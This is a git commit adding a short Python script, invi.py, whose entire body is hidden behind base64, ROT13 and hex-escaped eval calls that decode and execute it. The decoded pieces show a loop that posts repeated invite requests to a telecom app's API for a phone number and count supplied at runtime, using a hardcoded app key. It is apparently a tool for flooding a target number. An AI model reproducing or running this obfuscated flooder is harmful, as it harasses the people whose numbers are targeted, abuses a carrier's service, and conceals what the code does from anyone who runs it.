5c81f1cb08e03e8a76d759446876e3215e1638b1
Mr. Foisal <83734733+MohammadFoisal@users.noreply.github.com>
2021-12-26 17:51:55 +0600

    Create invi.py

---
+++ invi.py
@@ -0,0 +1,11 @@
+
+ 
+
+import base64, codecs
+magic = 'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCm1zaXNkbj1pbnB1dCgiXG5cdGVudGVyIE51bWJlciB3aXRoIDg4OiAiKQpuYW1lID0gaW5wdXQoIlxuRW50ZXIgTGtleTogIikKaT1pbnQoaW5wdXQoIkVudGVyIENvdW50OiAiKSkKeT0wCndoaWx'
+love = 'yVUx8nGbXVPNtVPNtqKWfZvN9VPqbqUEjpmbiY2AcpzAfMF5lo2WcYzAioF5vMP9grJkcMzHiLKOjLKOcY2SjpTAuoTjhpTujC29jCKAyozEQo250LJA0GTymqPMuL3Eco249nJ52nKEyWjbtVPNtVPOgrJ9vnwNtCFO7W21mnKAxovp6oKAcp2EhsD'
+god = 'ogICAgICB0cnk6CiAgICAgICAgeD1yZXF1ZXN0cy5wb3N0KHVybDIsIGRhdGEgPSBteW9iajAsIGhlYWRlcnMgPSB7IngtYXBpLWtleSI6IG5hbWUsIngtYXBwLWtleSI6IjAwMG9jMHNvNDhvd2t3NHMwd3dvNGMwMGcwMDgwNHc4MGd3a3c4a2cif'
+destiny = 'FxXVPNtVPNtVPO5CKxeZFNtVPNtVNbtVPNtVPNtVUOlnJ50XUxfrP50MKu0YPWpqUEupzqyqPOhqJ1vMKV6VPVfoKAcp2EhXFNtVNbtVPNtVPOyrTAypUD6VPNtVPNtVNbtVPNtVPNtVUOlnJ50XPWpoykhKUEpqRIlpz9lVTAioz5yozA0nJ9hVvx='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
